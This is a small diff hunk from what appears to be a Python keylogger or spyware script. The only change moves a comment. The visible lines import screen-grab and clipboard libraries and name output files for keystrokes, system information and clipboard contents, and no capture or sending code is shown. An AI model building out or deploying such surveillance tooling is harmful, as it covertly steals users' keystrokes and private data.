@@ -28,8 +28,8 @@ from multiprocessing import Process, freeze_support
 from PIL import ImageGrab
 from win32clipboard import CloseClipboard
 
-#Variables
 
+#Variables
 keys_information="key_log.txt"
 system_information="system_info.txt"
 clipboard_information="clipboard.txt"
